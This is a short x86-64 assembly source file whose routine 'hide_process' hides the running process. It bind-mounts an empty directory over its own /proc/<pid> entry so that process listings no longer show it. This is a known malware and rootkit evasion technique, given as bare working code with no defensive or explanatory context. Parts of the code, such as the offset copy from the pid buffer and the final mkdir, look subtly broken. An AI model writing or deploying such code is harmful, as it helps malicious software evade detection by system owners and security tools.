%include "uitoa.asm"

section .text
    global hide_process

; find pid
; mount empty folder into /proc/pid file
hide_process:
  ; mkdir the empty dir
  mov rax, 83
  mov rdi, mountPoint
  mov rsi, 422
  syscall

  mov rax, 39
  syscall

  mov rdi, pid
  mov rsi, rax  
  call uitoa

  mov rdi, [pid+1]
  lea rsi, [rel process]
  mov qword [rsi+6], rdi

  ; mount the process dir into empty
  mov rax, 165
  mov rdi, mountPoint
  mov rsi, process 
  mov rdx, 0 
  mov r10, 4096
  mov r8, 0
  syscall

  test rax, rax
  js error

  ; rm the empty dir
  mov rax, 84
  mov rdi, mountPoint
  syscall

  ; mkdir the hidded process
  mov rax, 83 
  lea rdi, [process+6]  
  mov rsi, 422
  syscall

  ret

section .data
  mountPoint db "./empty", 0
  process db "/proc/000000", 0

section .bss
  pid resb 12 
